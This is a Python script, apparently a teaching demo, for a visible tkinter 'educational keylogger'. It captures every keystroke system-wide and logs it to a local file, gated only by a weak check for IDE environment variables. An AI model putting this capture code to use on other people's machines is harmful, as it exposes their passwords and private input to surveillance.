# keylogger_educativo_global.py
# SOLO PARA FINES EDUCATIVOS

import tkinter as tk
from tkinter import ttk
from datetime import datetime, timedelta
import os
import sys
from pynput import keyboard
import threading

LOGFILE = "keypress_log.txt"

class KeyloggerEducativo:
    def __init__(self, root):
        self.root = root
        root.title("🔒 Keylogger Educativo - Solo para investigación")
        root.geometry("900x600")
        root.protocol("WM_DELETE_WINDOW", self.on_close)
        
        # Verificar si se ejecuta desde entorno de desarrollo
        self.dev_mode = self._check_dev_environment()
        
        # Estado de captura
        self.capturing = False
        self.listener = None
        self.key_timestamps = []
        self.total_keys = 0
        self._running = True
        
        self._setup_ui()
        self._update_stats_loop()
        
    def _check_dev_environment(self):
        """Verifica si se ejecuta desde VS Code, Visual Studio o entorno de desarrollo"""
        # Detectar si se ejecuta desde debugger o IDE
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            return True
        
        # Detectar variables de entorno de IDEs comunes
        dev_vars = [
            'VSCODE_PID', 'VSCODE_IPC_HOOK',  # VS Code
            'TERM_PROGRAM',  # VS Code Terminal
            'PYCHARM_HOSTED',  # PyCharm
            'VISUAL_STUDIO',  # Visual Studio
        ]
        
        for var in dev_vars:
            if var in os.environ:
                return True
        
        # Detectar si el script está en modo interactivo
        if hasattr(sys, 'ps1'):
            return True
            
        return False
    
    def _setup_ui(self):
        # Header con advertencia
        header_frame = tk.Frame(self.root, bg="#ff6b6b", relief="raised", bd=2)
        header_frame.pack(fill="x", padx=0, pady=0)
        
        tk.Label(
            header_frame,
            text="⚠️ ADVERTENCIA: Herramienta Educativa - Solo para uso personal en VM",
            font=("Segoe UI", 12, "bold"),
            bg="#ff6b6b",
            fg="white"
        ).pack(pady=8)
        
        # Info frame
        info_frame = tk.LabelFrame(self.root, text="Información de Seguridad", padx=10, pady=10)
        info_frame.pack(fill="x", padx=10, pady=10)
        
        dev_status = "✅ DETECTADO" if self.dev_mode else "❌ NO DETECTADO"
        dev_color = "#28a745" if self.dev_mode else "#dc3545"
        
        tk.Label(
            info_frame,
            text=f"Entorno de Desarrollo: {dev_status}",
            font=("Segoe UI", 10, "bold"),
            fg=dev_color
        ).pack(anchor="w")
        
        tk.Label(
            info_frame,
            text="• Este programa captura teclas GLOBALMENTE en el sistema",
            justify="left"
        ).pack(anchor="w")
        
        tk.Label(
            info_frame,
            text="• Solo se ejecutará si se detecta un entorno de desarrollo (VS Code, Visual Studio, etc.)",
            justify="left"
        ).pack(anchor="w")
        
        tk.Label(
            info_frame,
            text="• La captura se detiene automáticamente al cerrar la ventana",
            justify="left"
        ).pack(anchor="w")
        
        # Control Panel
        control_frame = tk.LabelFrame(self.root, text="Control de Captura", padx=10, pady=10)
        control_frame.pack(fill="x", padx=10, pady=10)
        
        btn_frame = tk.Frame(control_frame)
        btn_frame.pack(fill="x")
        
        self.start_btn = tk.Button(
            btn_frame,
            text="▶ Iniciar Captura Global",
            command=self.start_capture,
            bg="#28a745",
            fg="white",
            font=("Segoe UI", 10, "bold"),
            padx=20,
            pady=8,
            state="normal" if self.dev_mode else "disabled"
        )
        self.start_btn.pack(side="left", padx=5)
        
        self.stop_btn = tk.Button(
            btn_frame,
            text="⏸ Detener Captura",
            command=self.stop_capture,
            bg="#dc3545",
            fg="white",
            font=("Segoe UI", 10, "bold"),
            padx=20,
            pady=8,
            state="disabled"
        )
        self.stop_btn.pack(side="left", padx=5)
        
        self.minimize_btn = tk.Button(
            btn_frame,
            text="🔽 Minimizar a Bandeja",
            command=self.minimize_window,
            bg="#007bff",
            fg="white",
            font=("Segoe UI", 10, "bold"),
            padx=20,
            pady=8
        )
        self.minimize_btn.pack(side="left", padx=5)
        
        # Status
        self.status_label = tk.Label(
            control_frame,
            text="🔴 Estado: Inactivo",
            font=("Segoe UI", 10, "bold"),
            fg="#dc3545"
        )
        self.status_label.pack(pady=(10,0))
        
        if not self.dev_mode:
            tk.Label(
                control_frame,
                text="⚠️ No se detectó entorno de desarrollo. Por seguridad, la captura está deshabilitada.",
                fg="#dc3545",
                font=("Segoe UI", 9)
            ).pack(pady=(5,0))
        
        # Log display
        log_frame = tk.LabelFrame(self.root, text="Registro de Teclas (últimas 100)", padx=10, pady=10)
        log_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Scrollbar
        scrollbar = tk.Scrollbar(log_frame)
        scrollbar.pack(side="right", fill="y")
        
        self.text = tk.Text(
            log_frame,
            height=10,
            wrap="none",
            yscrollcommand=scrollbar.set,
            font=("Consolas", 9)
        )
        self.text.pack(fill="both", expand=True)
        scrollbar.config(command=self.text.yview)
        
        self.text.insert("end", "=== Registro de captura global ===\n")
        self.text.insert("end", "Las teclas capturadas aparecerán aquí...\n\n")
        self.text.configure(state="disabled")
        
        # Stats and controls
        bottom_frame = tk.Frame(self.root)
        bottom_frame.pack(fill="x", padx=10, pady=10)
        
        self.stats_label = tk.Label(
            bottom_frame,
            text="Teclas totales: 0 | Últimos 60s: 0 kpm | Sesión: 0:00:00",
            font=("Segoe UI", 9)
        )
        self.stats_label.pack(side="left")
        
        tk.Button(
            bottom_frame,
            text="🗑️ Limpiar Log",
            command=self.clear_logs,
            padx=10
        ).pack(side="right", padx=5)
        
        tk.Button(
            bottom_frame,
            text="📁 Abrir Archivo Log",
            command=self.open_log_file,
            padx=10
        ).pack(side="right", padx=5)
        
        self.session_start = None
    
    def start_capture(self):
        if not self.dev_mode:
            self._show_error("No se puede iniciar: entorno de desarrollo no detectado")
            return
            
        if self.capturing:
            return
        
        self.capturing = True
        self.session_start = datetime.now()
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.status_label.config(text="🟢 Estado: CAPTURANDO GLOBALMENTE", fg="#28a745")
        
        # Iniciar listener en thread separado
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        
        self._log_event("=== CAPTURA INICIADA ===")
    
    def stop_capture(self):
        if not self.capturing:
            return
        
        self.capturing = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.status_label.config(text="🔴 Estado: Detenido", fg="#dc3545")
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        self._log_event("=== CAPTURA DETENIDA ===")
    
    def on_key_press(self, key):
        if not self.capturing:
            return
        
        try:
            # Obtener representación de la tecla
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = str(key).replace('Key.', '')
            
            timestamp = datetime.now()
            self.key_timestamps.append(timestamp)
            self.total_keys += 1
            
            # Limpiar timestamps antiguos (últimos 5 minutos)
            cutoff = timestamp - timedelta(minutes=5)
            self.key_timestamps = [t for t in self.key_timestamps if t >= cutoff]
            
            # Formatear mensaje
            ts_str = timestamp.strftime("%Y-%m-%d %H:%M:%S")
            message = f"[{ts_str}] {key_str}\n"
            
            # Guardar en archivo
            with open(LOGFILE, "a", encoding="utf-8") as f:
                f.write(message)
            
            # Mostrar en UI (thread-safe)
            self.root.after(0, lambda: self._append_to_text(message))
            
        except Exception as e:
            print(f"Error en captura: {e}")
    
    def _append_to_text(self, message):
        self.text.configure(state="normal")
        self.text.insert("end", message)
        
        # Mantener solo últimas 100 líneas
        lines = int(self.text.index('end-1c').split('.')[0])
        if lines > 103:
            self.text.delete('1.0', f'{lines-100}.0')
        
        self.text.see("end")
        self.text.configure(state="disabled")
    
    def _log_event(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        full_message = f"\n[{timestamp}] {message}\n\n"
        
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(full_message)
        
        self.root.after(0, lambda: self._append_to_text(full_message))
    
    def _update_stats_loop(self):
        if not self._running:
            return
        
        now = datetime.now()
        cutoff = now - timedelta(seconds=60)
        recent = [t for t in self.key_timestamps if t >= cutoff]
        kpm = len(recent)
        
        # Calcular tiempo de sesión
        if self.session_start and self.capturing:
            elapsed = now - self.session_start
            hours = int(elapsed.total_seconds() // 3600)
            minutes = int((elapsed.total_seconds() % 3600) // 60)
            seconds = int(elapsed.total_seconds() % 60)
            session_time = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        else:
            session_time = "0:00:00"
        
        self.stats_label.config(
            text=f"Teclas totales: {self.total_keys} | Últimos 60s: {kpm} kpm | Sesión: {session_time}"
        )
        
        self.root.after(1000, self._update_stats_loop)
    
    def clear_logs(self):
        self.text.configure(state="normal")
        self.text.delete("1.0", "end")
        self.text.insert("end", "=== Registro de captura global ===\n")
        self.text.insert("end", "Las teclas capturadas aparecerán aquí...\n\n")
        self.text.configure(state="disabled")
        
        with open(LOGFILE, "w", encoding="utf-8") as f:
            f.write("")
        
        self.key_timestamps = []
        self.total_keys = 0
    
    def open_log_file(self):
        path = os.path.abspath(LOGFILE)
        try:
            os.startfile(path)
        except Exception:
            self._show_error(f"No se pudo abrir: {path}")
    
    def minimize_window(self):
        self.root.iconify()
    
    def _show_error(self, message):
        dlg = tk.Toplevel(self.root)
        dlg.title("Error")
        dlg.geometry("400x150")
        tk.Label(dlg, text=message, wraplength=350, pady=20).pack()
        tk.Button(dlg, text="Cerrar", command=dlg.destroy).pack(pady=10)
    
    def on_close(self):
        self._running = False
        self.stop_capture()
        self.root.destroy()

if __name__ == "__main__":
    # Crear archivo de log si no existe
    open(LOGFILE, "a", encoding="utf-8").close()
    
    root = tk.Tk()
    app = KeyloggerEducativo(root)
    root.mainloop()